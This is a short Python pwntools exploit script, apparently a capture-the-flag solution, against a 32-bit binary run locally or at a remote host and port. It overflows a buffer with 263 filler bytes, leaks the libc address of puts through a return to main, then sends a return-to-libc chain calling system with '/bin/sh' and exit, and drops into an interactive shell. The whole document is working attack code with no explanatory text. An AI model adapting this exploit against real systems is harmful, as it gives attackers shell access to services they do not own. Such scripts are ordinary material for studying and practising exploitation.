#!/usr/bin/env python
from pwn import *
import sys

context.terminal = 'kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c'.split()

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1])
    gdb.attach(r, 'b *0x08048602')

payload  = 'A' * 263
payload += p32(0x80483b0) # sym.imp.puts
payload += p32(0x8048580) # main
payload += p32(0x804a010) # reloc.puts
r.sendline(payload)

r.recvuntil('Nothing todo here. :\\\n')
libc = u32(r.recvline(False)[:4]) - 0x0006e7a0

print hex(libc)

payload  = 'A' * 263
payload += p32(libc + 0x00041c50) # system
payload += p32(libc + 0x000337b0) # exit
payload += p32(libc + 0x19aaaa) # binsh
r.sendline(payload)

r.interactive()